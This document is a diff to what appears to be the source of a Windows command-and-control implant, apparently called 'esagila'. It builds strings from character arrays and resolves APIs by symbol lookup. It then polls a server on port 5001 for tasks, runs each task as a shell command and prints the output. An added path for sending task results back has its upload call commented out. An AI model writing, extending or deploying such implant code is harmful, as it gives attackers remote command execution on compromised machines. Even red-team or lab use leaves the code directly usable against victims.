@@ -52,7 +52,7 @@ typedef BOOL(WINAPI *WINHTTPQUERYHEADERS)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPD
 typedef DWORD(WINAPI *STRTOINTW)(PCWSTR);
 
 // standard esagila api
-typedef BOOL(WINAPI *RUNCMD)(CHAR* cmd);
+typedef CHAR*(WINAPI *RUNCMD)(CCHAR* cmd);
 
 #define WINHTTP_NO_ADDITIONAL_HEADERS NULL
 #define WINHTTP_NO_REQUEST_DATA NULL
@@ -1021,9 +1021,9 @@ void messagebox() {
     PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
 
     WCHAR wServer[] = {'1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0};
-    WCHAR path[] = {'/', 't', 'a', 's', 'k', 's', '/', 0};
+    WCHAR tasksPath[] = {'/', 't', 'a', 's', 'k', 's', '/', 0};
     WCHAR uuid[] = {'1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0};
-    WCHAR* fullPath = myConcat(api, path, uuid);
+    WCHAR* fullPath = myConcat(api, tasksPath, uuid);
     INTERNET_PORT port = 5001;
 
     CHAR* jsonResponse = GetRequest(api, wServer, port, fullPath);
@@ -1035,7 +1035,13 @@ void messagebox() {
     CHAR* task;
     task = parseJsonTask(api, jsonResponse, &taskId, &agentUuid);
 
-    ((RUNCMD)PEsgStdApi->RunCmd)(task);
+    CHAR* output;
+    WCHAR* json;
+    output = ((RUNCMD)PEsgStdApi->RunCmd)(task);
+
+    WCHAR sendOutputPath[] = {'/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u', 't', '/', 0};
+    ((PRINTF)api->printf)(output);
+    //PostRequest(api, wServer, port, myConcat(api, sendOutputPath, uuid), json);
 
     ((FREE)api->free)(jsonResponse);
     //((FREE)api->free)(pEsgStdDll);
